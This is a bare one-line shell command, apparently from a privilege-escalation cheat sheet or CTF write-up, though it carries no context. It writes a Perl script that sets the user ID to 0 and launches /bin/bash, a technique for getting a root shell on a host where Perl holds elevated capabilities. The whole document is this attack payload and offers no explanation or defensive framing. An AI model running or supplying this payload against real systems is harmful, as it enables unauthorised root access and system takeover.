```c
echo -ne '#!/bin/perl \nuse POSIX qw(setuid); \nPOSIX::setuid(0); \nexec "/bin/bash";' > script.pl
```
